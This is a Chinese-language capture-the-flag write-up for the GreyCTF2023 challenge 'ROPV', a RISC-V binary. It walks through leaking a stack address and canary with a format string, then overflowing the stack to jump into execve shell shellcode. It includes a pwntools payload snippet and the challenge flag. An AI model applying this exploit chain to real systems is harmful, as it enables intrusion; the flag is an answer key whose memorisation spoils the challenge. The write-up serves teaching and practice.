# GreyCTF2023 ROPV

## 题目简述

题目是静态链接的 RISC-V 64 位程序。`main` 两次把最多 1024 字节读入 8 字节栈缓冲区，随后又直接执行 `printf(str)`。栈 canary 阻止直接覆盖返回地址，但第一次格式化字符串可同时泄露缓冲区地址和 canary，第二次再完成控制流劫持。

## 解题过程

第一次输入保持在 8 字节以内，使用：

```text
%p %9$p
```

第一个 `%p` 泄露当前输入缓冲区的栈地址，`%9$p` 泄露 canary。RISC-V `main` 的栈布局为：缓冲区 8 字节、canary 8 字节、保存的 `s0` 8 字节、保存的 `ra` 8 字节。因此第二阶段构造：

```python
stack = int(io.recvuntil(b" ", drop=True), 16)
canary = int(io.recvline(), 16)

payload  = b"A" * 8
payload += p64(canary)
payload += b"B" * 8
payload += p64(stack + 32)
payload += riscv64_execve_shellcode
io.sendlineafter(b"Echo server: ", payload)
```

仓库外部复现脚本所用的服务/QEMU 执行环境允许跳回栈上这段 RISC-V shellcode；shellcode布置 `/bin/sh` 参数并执行 `execve`。取得 shell 后读取：

```text
grey{riscv_risc5_ropv_rop5_b349340j935gj09}
```

## 方法总结

利用链把两个漏洞按阶段组合：格式化字符串负责绕过地址随机化和 canary，栈溢出负责覆盖 `ra`。在非 x86 题目中应依据真实 ABI 还原保存寄存器顺序，并验证远端模拟器的内存执行语义；不能只根据本机 `checksec` 标签推断 QEMU 用户态的最终行为。
